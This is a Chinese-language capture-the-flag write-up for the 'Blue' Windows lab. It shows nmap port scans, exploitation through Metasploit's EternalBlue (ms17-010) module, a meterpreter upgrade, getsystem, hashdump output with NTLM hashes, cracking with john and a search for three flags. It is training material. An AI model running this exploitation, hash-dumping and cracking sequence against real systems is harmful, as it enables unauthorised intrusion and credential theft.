---
icon: pen-to-square
date: 2025-04-22
tags: 
title: blue
category:
  - 项目
---
## 解答过程
### nmap扫描
```bash
namp -sn <ip>
```
发现主机

```bash
sudo nmap --min-rate 10000 -p- <ip> -oA nmapscan/ports
```
扫描端口
```bash
└─# cat ports.nmap
# Nmap 7.94SVN scan initiated Tue Apr 22 20:27:34 2025 as: nmap --min-rate 10000 -p- -oA 10.10.111.35/ports 10.10.111.35
Nmap scan report for 10.10.111.35
Host is up (7.9s latency).
Not shown: 58579 filtered tcp ports (no-response), 6952 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

# Nmap done at Tue Apr 22 20:28:17 2025 -- 1 IP address (1 host up) scanned in 43.28 seconds
```
发现可能存在高危漏洞`ms17-010`
search一下ms17-010发现
`exploit/windows/smb/ms17_010_eternalblue`模块
设置好options后进行下一步操作
获得反弹bash
multi/manage/shell_to_meterpreter
使用meterpreter进行提升权限
运行getsystem即获得最高权限
然后输入
```bash
hashdump
```
可以获得NT哈希，用john进行破解

```bash
john --format=NT hash.txt --wordlist=/path/to/wordlist.txt
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

```
用户名:用户ID:LM哈希:NTLM哈希:::
```
## 寻找flag
首先提示了再系统根目录会发现flag，我们转到系统根目录
```bash
cat C:\\flag1.txt
```
获得flag1.txt
flag2提示可以在windows存储密码的位置发现
windows存储密码的位置为
```bash
%SystemRoot%\\System32\\config\\SAM
```

第三个flag位置确实没看懂，直接梭哈吧
用`search`命令在C盘根目录进行搜索
```bash
meterpreter > search -d C:\\ -f flag3.txt -r
Found 1 result...
=================

Path                              Size (bytes)  Modified (UTC)
----                              ------------  --------------
C:\Users\Jon\Documents\flag3.txt  37            2019-03-18 03:26:36 +0800
```

另外附赠linux查找文件的指令
```bash
find / -name "rockyou.txt" 2>/dev/null
```

发现flag